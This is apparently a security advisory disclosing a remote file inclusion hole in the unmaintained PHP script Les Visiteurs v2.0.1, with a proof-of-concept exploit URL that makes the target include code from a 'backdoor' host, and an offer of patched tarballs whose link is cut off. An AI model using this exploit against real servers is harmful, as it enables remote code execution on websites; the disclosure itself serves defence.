Subject: Les Visiteurs v2.0.1 code injection vulnerability




Les Visiteurs is a great statistics script written in php.
It gives you some graphicals informations on visitors of
your website.

This script was distributed by phpinfo.net but is no more
maintained since a year.

---------
In this version severals unprotected includes can be found 
in files:

- include/config.inc.php
- include/new-visitor.inc.php

It is possible to include a php file from a backdoor server, 
and execute it on the target's server.
You just have to create on the backdoor srv these files:
- lang/<lang>.inc.php
- db/db_mysql.inc.php

fill one with something like:
<?
echo '<?
echo "<br><br>included from backdoor server :p<br>";
?>';
?>

and call an url as:
http://host/path/include/config.inc.php?lvc_include_dir=http://backdoor/
---------


Because the script is not maintained and will not be patched,
i make some tarballs with a patched version.

You will find it at this url:
